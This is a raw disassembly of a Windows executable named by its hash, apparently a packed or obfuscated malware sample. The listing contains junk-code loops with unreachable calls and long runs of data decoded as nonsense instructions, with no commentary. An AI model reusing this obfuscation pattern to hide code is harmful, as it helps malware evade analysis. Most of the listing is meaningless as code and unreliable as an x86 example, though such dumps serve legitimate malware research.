
eb4663c68443cb0b2c7d727fa0e7293270d022c71811a6b397a43ae35961ca78.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43365b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4336f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4336a7
  401023:	or     DWORD PTR ds:0x433653,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433643,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [edx+0x7c81ec61],edi
  40104c:	jl     0x4010ca
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    ecx,DWORD PTR ds:0x330f023f
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x43f5:0xea99a6c9
  4010ff:	mov    DWORD PTR [ecx],edx
  401101:	xchg   edx,eax
  401102:	outs   dx,DWORD PTR ds:[esi]
  401103:	adc    al,0xde
  401105:	sub    bh,bh
  401107:	xchg   edi,eax
  401108:	mov    ds:0x62f18f20,al
  40110d:	mov    dl,0xd7
  40110f:	cdq    
  401110:	shl    DWORD PTR [esi+0x73],cl
  401113:	jbe    0x4010da
  401115:	das    
  401116:	inc    edi
  401117:	js     0x4010da
  401119:	or     bl,BYTE PTR [esi+edx*2]
  40111c:	(bad)  
  40111d:	fwait
  40111e:	xchg   esp,eax
  40111f:	or     BYTE PTR [edx+0x7ec396a4],bl
  401125:	ins    DWORD PTR es:[edi],dx
  401126:	daa    
  401127:	and    eax,0x4a81325e
  40112c:	and    dl,BYTE PTR [esi+edi*2]
  40112f:	xchg   ecx,eax
  401130:	jo     0x401173
  401132:	sbb    DWORD PTR [ebx+0x1d],edx
  401135:	xchg   cl,al
  401137:	loope  0x40112d
  401139:	repnz shl DWORD PTR [esi-0x36997a5a],cl
  401140:	xor    DWORD PTR [ecx-0x5e],edi
  401143:	mov    al,ds:0x2ffe4506
  401148:	sbb    BYTE PTR ds:0xe6058312,dh
  40114e:	and    ecx,esi
  401150:	inc    esi
  401151:	or     DWORD PTR [edx+0x63],eax
  401154:	pop    esp
  401155:	and    DWORD PTR [edi],ebx
  401157:	jge    0x4011ce
  401159:	retf   
  40115a:	dec    esi
  40115b:	cmp    BYTE PTR ds:0x41c7f833,bh
  401161:	dec    ebp
  401162:	ds int3 
  401164:	pushf  
  401165:	ret    
  401166:	dec    edi
  401167:	inc    esp
  401168:	push   ss
  401169:	mov    gs,WORD PTR [edx+0xa]
  40116c:	shr    BYTE PTR [ebp-0x66],cl
  40116f:	or     DWORD PTR [edx-0x70],esp
  401172:	xchg   DWORD PTR [eax+0x1eed0828],ebx
  401178:	adc    esp,ebx
  40117a:	inc    esp
  40117b:	out    dx,eax
  40117c:	test   eax,0xe97aef1
  401181:	out    0x44,eax
  401183:	jmp    DWORD PTR [edi]
  401185:	addps  xmm0,XMMWORD PTR [edi]
  401188:	test   eax,0xf6f51b6a
  40118d:	inc    ecx
  40118e:	(bad)  
  40118f:	mov    edx,0xcffbc9ad
  401194:	or     bh,BYTE PTR [esi+ebp*8]
  401197:	jb     0x40112e
  401199:	push   cs
  40119a:	sbb    bh,BYTE PTR [ebp+0x68e08142]
  4011a0:	jne    0x401123
  4011a2:	aad    0x59
  4011a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011a5:	fs sbb DWORD PTR fs:[ecx-0x5c],0xffffff89
  4011ab:	ins    BYTE PTR es:[edi],dx
  4011ac:	mov    edx,0x800b15b
  4011b1:	fnclex 
  4011b3:	adc    edi,DWORD PTR [ecx+0x3b]
  4011b6:	and    bh,BYTE PTR [ebx*4-0x1289f5ef]
  4011bd:	mul    ch
  4011bf:	pop    ds
  4011c0:	sub    ch,ah
  4011c2:	je     0x401232
  4011c4:	jae    0x4011a1
  4011c6:	daa    
  4011c7:	jecxz  0x401171
  4011c9:	jl     0x40123d
  4011cb:	test   BYTE PTR [eax+0x20],bl
  4011ce:	pop    ds
  4011cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011d0:	rol    ebp,0x9
  4011d3:	cdq    
  4011d4:	xchg   edx,eax
  4011d5:	inc    eax
  4011d6:	mov    ds:0xe8a04cfc,eax
  4011db:	ins    BYTE PTR es:[edi],dx
  4011dc:	mov    ch,0xb5
  4011de:	repnz imul ebx,esi,0xad985618
  4011e5:	ret    
  4011e6:	retf   0x35e9
  4011e9:	jg     0x401255
  4011eb:	ror    BYTE PTR [ebp-0x430e501f],1
  4011f1:	cmp    DWORD PTR [edi-0x155e928d],esi
  4011f7:	call   0xa1261364
  4011fc:	mov    ebx,0xb05048b9
  401201:	jae    0x4011df
  401203:	(bad)  
  401204:	and    al,bl
  401206:	mov    dl,0x22
  401208:	pop    ds
  401209:	sbb    ebp,ebp
  40120b:	out    0x23,eax
  40120d:	(bad)  
  40120e:	ds mov ch,0x98
  401211:	adc    al,0x96
  401213:	pusha  
  401214:	test   DWORD PTR [esi],ebx
  401216:	pop    ebp
  401217:	pop    ds
  401218:	lods   al,BYTE PTR ds:[esi]
  401219:	ret    
  40121a:	add    BYTE PTR [ecx+ebx*2+0x6f],bh
  40121e:	xchg   BYTE PTR [edi-0x54932bea],ah
  401224:	loopne 0x4011c4
  401226:	adc    dl,dh
  401228:	xchg   ebx,eax
  401229:	dec    eax
  40122a:	mov    ds:0x2a1169da,al
  40122f:	mov    bh,0x56
  401231:	aas    
  401232:	dec    ebp
  401233:	scas   eax,DWORD PTR es:[edi]
  401234:	xchg   edi,eax
  401235:	outs   dx,DWORD PTR ds:[esi]
  401236:	mov    bl,0xd2
  401238:	sub    edi,eax
  40123a:	data16 jne 0x4011c3
  40123d:	nop
  40123e:	jmp    0xe722de2d
  401243:	out    0x62,eax
  401245:	int    0xfa
  401247:	mov    bl,0xb
  401249:	cmovno ebp,DWORD PTR [esi+0x10085def]
  401250:	and    esp,DWORD PTR ds:0x3a452708
  401256:	fsubr  QWORD PTR [esi-0x180bde95]
  40125c:	loopne 0x40129c
  40125e:	inc    esp
  40125f:	lock jmp 0x8841f87f
  401265:	cmp    eax,0x3960eacf
  40126a:	and    BYTE PTR [edx-0x61a0079],dl
  401270:	jmp    0xc19de9b2
  401275:	xchg   edi,eax
  401276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401277:	cdq    
  401278:	and    edi,DWORD PTR [ebp-0x690b6c79]
  40127e:	lahf   
  40127f:	gs sbb eax,0xc3844d4b
  401285:	pop    edx
  401286:	pusha  
  401287:	dec    ebp
  401288:	in     al,0x54
  40128a:	or     edi,DWORD PTR [esi+esi*4-0x7f]
  40128e:	and    DWORD PTR [edx+0x2d0d75f0],ebx
  401294:	arpl   WORD PTR ds:0x331371cc,bx
  40129a:	dec    ecx
  40129b:	push   ebp
  40129c:	jle    0x40124b
  40129e:	pop    esi
  40129f:	lea    ebp,[edi+0x4b7eec4b]
  4012a5:	test   al,0xe2
  4012a7:	cmp    ch,BYTE PTR [ebx+eax*1-0x4e]
  4012ab:	test   BYTE PTR [eax],ah
  4012ad:	icebp  
  4012ae:	dec    ebx
  4012af:	clc    
  4012b0:	jne    0x4012a6
  4012b2:	je     0x40131c
  4012b4:	sub    dl,BYTE PTR [eax-0x1]
  4012b7:	cmc    
  4012b8:	rcl    BYTE PTR [edx-0x509ea5f],0xb
  4012bf:	push   ds
  4012c0:	dec    ebx
  4012c1:	test   BYTE PTR [eax],al
  4012c3:	pop    ebp
  4012c4:	mov    dl,0x50
  4012c6:	sbb    al,BYTE PTR [ebx]
  4012c8:	dec    esp
  4012c9:	inc    esi
  4012ca:	sbb    esp,esi
  4012cc:	and    BYTE PTR ds:0x876dc8fe,0x34
  4012d3:	jge    0x4012af
  4012d5:	mov    ds:0x2d5c4713,eax
  4012da:	pop    esp
  4012db:	fdiv   QWORD PTR [edx]
  4012dd:	jae    0x4012db
  4012df:	jmp    0x40135b
  4012e1:	in     eax,0x52
  4012e3:	ins    BYTE PTR es:[edi],dx
  4012e4:	in     al,dx
  4012e5:	loope  0x401275
  4012e7:	push   cs
  4012e8:	xchg   esp,eax
  4012e9:	pop    esp
  4012ea:	(bad)  
  4012eb:	fcomp  DWORD PTR [ebx]
  4012ed:	(bad)  
  4012ee:	sti    
  4012ef:	arpl   WORD PTR [ecx],bx
  4012f1:	push   ebp
  4012f2:	adc    bh,BYTE PTR [ebx]
  4012f4:	pop    esi
  4012f5:	call   0x67e0:0x3f4b3500
  4012fc:	adc    eax,0x71e1092
  401301:	sahf   
  401302:	pop    eax
  401303:	push   ebx
  401304:	cmc    
  401305:	xchg   ebx,eax
  401306:	mov    edx,0xb54d60a1
  40130b:	and    DWORD PTR [esi],esi
  40130d:	or     DWORD PTR [ecx+0x51235468],0x65
  401314:	int3   
  401315:	mov    eax,ss:0xab6b4336
  40131b:	cmp    al,0xf0
  40131d:	test   ebx,eax
  40131f:	outs   dx,DWORD PTR ds:[esi]
  401320:	iret   
  401321:	mov    eax,0xf0882553
  401326:	sub    edi,ebx
  401328:	xor    ebx,0xffffff86
  40132b:	enter  0xe0fa,0x21
  40132f:	pushf  
  401330:	or     edi,DWORD PTR [edx-0x2116a9a5]
  401336:	retf   0xcf8
  401339:	and    ch,BYTE PTR ds:0x8458b53
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4336a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43369b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43371f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43371f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43371f,ebx
  401379:	cmp    DWORD PTR ds:0x43371f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43371f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433663,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43369f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433697,0x19
  4013f7:	cmp    DWORD PTR ds:0x433697,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433697,0xb
  40140b:	jne    0x401421
  401411:	push   0x433653
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433697,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433697
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433697,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433697
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433697,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43364f,0x433643
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433653,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43371b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43371b
  40148e:	inc    eax
  40148f:	mov    ds:0x43371b,eax
  401494:	cmp    DWORD PTR ds:0x43371b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43371b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43371b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43371b,eax
  4014c4:	cmp    DWORD PTR ds:0x43371b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4336df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43365b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43364f,0x43369f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	idiv   BYTE PTR [edi]
  401514:	fwait
  401515:	repz addr16 jle 0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x4014ee
  40151f:	dec    esi
  401520:	lods   eax,DWORD PTR ds:[esi]
  401521:	mov    DWORD PTR [ebx+0x7a],ebp
  401524:	pop    eax
  401525:	sbb    bl,ch
  401527:	mov    ch,0xa6
  401529:	sbb    eax,DWORD PTR [ecx+0x4747c765]
  40152f:	inc    edi
  401530:	mov    edx,0xe3b7b4da
  401535:	pop    esp
  401536:	daa    
  401537:	fcom   DWORD PTR [eax+0x4c]
  40153a:	std    
  40153b:	lods   al,BYTE PTR ds:[esi]
  40153c:	icebp  
  40153d:	es push ecx
  40153f:	lods   al,BYTE PTR ds:[esi]
  401540:	push   ss
  401541:	add    ebx,DWORD PTR [eax-0x6e2fdaa1]
  401547:	push   0x2d716346
  40154c:	add    eax,0x109bcd1
  401551:	xchg   esi,eax
  401552:	adc    DWORD PTR [esi+eiz*8-0x7],0x30aaa7f0
  40155a:	fwait
  40155b:	xor    edi,DWORD PTR [edx+0x8bdae69]
  401561:	sahf   
  401562:	nop
  401563:	mov    eax,0xcb6f539
  401568:	mov    ds:0xa55c8a47,eax
  40156d:	das    
  40156e:	(bad)  
  40156f:	xor    al,0x3e
  401571:	jmp    0x7c6a:0x7d087b8c
  401578:	lock push 0x21
  40157b:	cmc    
  40157c:	or     dl,BYTE PTR [ebp+0x69877c9e]
  401582:	cdq    
  401583:	inc    ebp
  401584:	push   eax
  401585:	and    ch,al
  401587:	aaa    
  401588:	repz push 0xffffffaa
  40158b:	or     eax,0x52ef38bf
  401590:	in     eax,0xa8
  401592:	add    ax,0x64dc
  401596:	shl    DWORD PTR [ebp-0x39e01831],0x1e
  40159d:	dec    ebx
  40159e:	scas   al,BYTE PTR es:[edi]
  40159f:	pusha  
  4015a0:	pop    eax
  4015a1:	xchg   edi,eax
  4015a2:	leavew 
  4015a4:	push   edi
  4015a5:	xchg   esp,eax
  4015a6:	not    BYTE PTR [ecx-0x70b7a26d]
  4015ac:	dec    edi
  4015ad:	fistp  QWORD PTR [eax]
  4015af:	sbb    cl,BYTE PTR [ecx]
  4015b1:	jb     0x4015ea
  4015b3:	inc    esp
  4015b4:	mov    cl,0x81
  4015b6:	push   0x9d98467c
  4015bb:	adc    dl,BYTE PTR [edx+eiz*8]
  4015be:	mov    edx,0xddec07ce
  4015c3:	mov    ebp,0x29879b05
  4015c8:	and    DWORD PTR [ecx],0x7f
  4015cb:	push   ss
  4015cc:	jmp    0x1ff0:0x6d628a0d
  4015d3:	jno    0x4015ae
  4015d5:	cmp    eax,0x9eec75da
  4015da:	outs   dx,DWORD PTR ds:[esi]
  4015db:	loopne 0x40157d
  4015dd:	push   edx
  4015de:	sbb    edx,0x7a0f789
  4015e4:	fstp   DWORD PTR [ebx+0x22e6993f]
  4015ea:	cmp    DWORD PTR [edi-0x37],ebp
  4015ed:	mov    bh,0xb4
  4015ef:	jo     0x401584
  4015f1:	fisub  WORD PTR [ecx]
  4015f3:	and    cl,0xb8
  4015f6:	ja     0x401637
  4015f8:	xchg   edi,eax
  4015f9:	xor    eax,0x1efb36be
  4015fe:	mov    WORD PTR ds:0x20db00d6,ss
  401604:	cmp    DWORD PTR [edi+0x1b],esi
  401607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401608:	sub    BYTE PTR [ebx+0x268b112d],al
  40160e:	add    DWORD PTR [ebp+0x5],esi
  401611:	into   
  401612:	mov    esi,0xa98ca0a9
  401617:	sbb    ecx,DWORD PTR [edi+ebx*8+0x16]
  40161b:	lahf   
  40161c:	aad    0x1c
  40161e:	mov    ebx,0x866c0eca
  401623:	jno    0x40161e
  401625:	dec    edx
  401626:	pop    ss
  401627:	fnstenv [esi-0x39322645]
  40162d:	or     BYTE PTR ds:0x7bed4d0a,0x9
  401635:	test   BYTE PTR [edx],0x5a
  401638:	ret    
  401639:	mov    ch,ah
  40163b:	cwde   
  40163c:	push   ds
  40163d:	shl    BYTE PTR [esi],1
  40163f:	setns  dh
  401642:	cs dec eax
  401644:	and    al,0x15
  401646:	xlat   BYTE PTR ds:[ebx]
  401647:	mov    dl,0xb4
  401649:	sbb    BYTE PTR [eax+0x7d],ch
  40164c:	xor    al,0x36
  40164e:	mov    ah,0x2d
  401650:	addr16 cmp eax,0xd15909f9
  401656:	add    DWORD PTR [ecx-0x1b1b21ce],edi
  40165c:	sar    BYTE PTR [esi+ecx*8-0x1710aece],1
  401663:	inc    eax
  401664:	xchg   edi,eax
  401665:	push   es
  401666:	xchg   esp,eax
  401667:	clc    
  401668:	pop    ebx
  401669:	cmp    BYTE PTR [edx+eiz*2-0x249c759b],dh
  401670:	(bad)
  401673:	in     eax,dx
  401674:	sbb    esp,DWORD PTR [ebx-0x2a]
  401677:	cdq    
  401678:	out    0xef,al
  40167a:	cmp    ch,BYTE PTR [esi]
  40167c:	or     ecx,edx
  40167e:	adc    eax,0x3604da70
  401683:	push   ecx
  401684:	retf   0x3617
  401687:	push   ds
  401688:	scas   al,BYTE PTR es:[edi]
  401689:	adc    DWORD PTR [edx+0x49b772d],edi
  40168f:	xchg   ebx,eax
  401690:	fstp   TBYTE PTR [esi-0x62ca77de]
  401696:	inc    BYTE PTR [ecx+0x69d34e3]
  40169c:	out    0x5,al
  40169e:	mov    DWORD PTR [esi-0xb],ecx
  4016a1:	mov    ds:0x6843ad55,eax
  4016a6:	hlt    
  4016a7:	bound  eax,QWORD PTR [edi*4-0x43855d8]
  4016ae:	repz fimul DWORD PTR [edx]
  4016b1:	pop    eax
  4016b2:	or     DWORD PTR [esp+ebx*1],0x965a0921
  4016b9:	mov    al,0x33
  4016bb:	loope  0x4016f8
  4016bd:	jne    0x40164e
  4016bf:	xchg   ecx,eax
  4016c0:	adc    dh,BYTE PTR [eax]
  4016c2:	add    edi,DWORD PTR [edx-0x11d02ac0]
  4016c8:	xchg   DWORD PTR [ebp+0x17daa4d6],ecx
  4016ce:	outs   dx,DWORD PTR ds:[esi]
  4016cf:	xor    bl,dh
  4016d1:	dec    edi
  4016d2:	xchg   esi,eax
  4016d3:	dec    ecx
  4016d4:	push   cs
  4016d5:	pop    esi
  4016d6:	fisttp DWORD PTR [esp+eax*8+0x66]
  4016da:	xchg   ebp,eax
  4016dc:	arpl   WORD PTR [eax+0x33701742],bp
  4016e2:	pop    ecx
  4016e3:	jl     0x4016d0
  4016e5:	push   es
  4016e6:	xchg   BYTE PTR [esi+0x5245bc60],bl
  4016ec:	mov    ebp,0x9c6b6e8
  4016f1:	popf   
  4016f2:	jns    0x4016b6
  4016f4:	lock jmp 0x9aaf6dbf
  4016fa:	fdivrp st(7),st
  4016fc:	sub    al,0x2a
  4016fe:	xchg   ebp,eax
  4016ff:	push   ebx
  401700:	iret   
  401701:	scas   al,BYTE PTR es:[edi]
  401702:	stos   BYTE PTR es:[edi],al
  401703:	or     al,cl
  401705:	outs   dx,DWORD PTR ds:[esi]
  401706:	mov    bh,0x53
  401708:	push   eax
  401709:	push   esi
  40170a:	sub    al,0x7
  40170c:	retf   
  40170d:	inc    edi
  40170e:	das    
  40170f:	xchg   dl,ch
  401711:	cmp    al,0x8d
  401713:	test   BYTE PTR [ecx-0x4a5e1ff7],0xb8
  40171a:	shr    DWORD PTR [eax+0x7eab6ae3],cl
  401720:	ins    DWORD PTR es:[edi],dx
  401721:	iret   
  401722:	(bad)  
  401723:	icebp  
  401724:	pop    esi
  401725:	daa    
  401726:	retf   0x1c27
  401729:	(bad)  
  40172a:	lds    esp,FWORD PTR [ebx]
  40172c:	fcomi  st,st(0)
  40172e:	stos   DWORD PTR es:[edi],eax
  40172f:	mov    eax,0xc5b02613
  401734:	jne    0x401726
  401736:	lock xchg ebp,eax
  401738:	xlat   BYTE PTR ds:[ebx]
  401739:	and    edi,DWORD PTR [edi-0x6b581384]
  40173f:	jl     0x40172a
  401741:	xchg   ebp,eax
  401742:	shl    BYTE PTR [ecx],1
  401744:	mov    esp,0xead3a05b
  401749:	push   ebx
  40174a:	mov    dh,0xa6
  40174c:	jnp    0x401704
  40174e:	(bad)  [ebx+0x4cc04e5e]
  401754:	or     ecx,DWORD PTR [ebp-0x68]
  401757:	ss dec ecx
  401759:	in     al,dx
  40175a:	and    eax,0x97c46a52
  40175f:	jnp    0x401777
  401761:	xchg   ecx,eax
  401762:	xchg   BYTE PTR [edi],cl
  401764:	mov    ds:0x839356da,al
  401769:	xor    DWORD PTR [ebp-0x345a2ac2],ebx
  40176f:	push   ds
  401770:	sub    eax,0x3918a6bd
  401775:	das    
  401776:	mov    edx,0x3c34735c
  40177b:	fsubr  QWORD PTR [esi-0xa]
  40177e:	and    BYTE PTR [eax+0x44d0e0bf],ah
  401784:	daa    
  401785:	test   al,0xd7
  401787:	sub    al,0xd9
  401789:	xor    al,0x41
  40178b:	xchg   ebx,eax
  40178c:	ins    DWORD PTR es:[edi],dx
  40178d:	nop
  40178e:	add    BYTE PTR [ebp-0x59d93577],0x1e
  401795:	enter  0x37cd,0xd3
  401799:	into   
  40179a:	inc    ebp
  40179b:	std    
  40179c:	test   eax,0xdad733f9
  4017a1:	xor    DWORD PTR [ecx],esp
  4017a3:	jecxz  0x4017f3
  4017a5:	dec    ebx
  4017a6:	enter  0xd8be,0x8c
  4017aa:	mov    ecx,0xbd9a76ba
  4017af:	add    eax,0x62df884a
  4017b4:	sub    bh,BYTE PTR [edi]
  4017b6:	aam    0xe5
  4017b8:	mov    ah,0xe
  4017ba:	push   ds
  4017bb:	dec    ebx
  4017bc:	(bad)  
  4017bd:	retf   
  4017be:	dec    esp
  4017bf:	mov    BYTE PTR [ebp+0x31],dh
  4017c2:	imul   ebx,DWORD PTR [ecx],0xfffffffe
  4017c5:	cmp    dl,BYTE PTR [ecx+0x6ff9b7cf]
  4017cb:	(bad)  
  4017cd:	fs ds dec ebp
  4017d0:	icebp  
  4017d1:	jns    0x4017b6
  4017d3:	pop    eax
  4017d4:	push   ecx
  4017d5:	(bad)  
  4017d6:	test   DWORD PTR [ebx+0x470f1ebf],ecx
  4017dc:	push   0x14
  4017de:	repnz sub DWORD PTR [esi],0x88184f3a
  4017e5:	pop    edi
  4017e6:	ret    0x4623
  4017e9:	add    eax,0x128c7629
  4017ee:	int3   
  4017ef:	push   eax
  4017f0:	xchg   ebx,ebx
  4017f2:	jp     0x4017d5
  4017f4:	xchg   edx,eax
  4017f5:	stc    
  4017f6:	retf   0xeb45
  4017f9:	push   esp
  4017fa:	push   cs
  4017fb:	mov    ah,0x7a
  4017fd:	sar    DWORD PTR [edx+ebx*1],0x6c
  401801:	cs xor al,0x3a
  401804:	scas   eax,DWORD PTR es:[edi]
  401805:	push   ecx
  401806:	test   BYTE PTR [ebx],al
  401808:	or     BYTE PTR [ecx+0x433757],ah
  40180e:	add    DWORD PTR ds:0x43364b,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43369b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43369b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433663,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43372f,0x433717
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4336ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4336e7,0x18
  401872:	cmp    DWORD PTR ds:0x4336e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4336e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4336e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4336e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433717,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433717
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433717,edx
  4018db:	cmp    DWORD PTR ds:0x433717,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433717,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43376f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
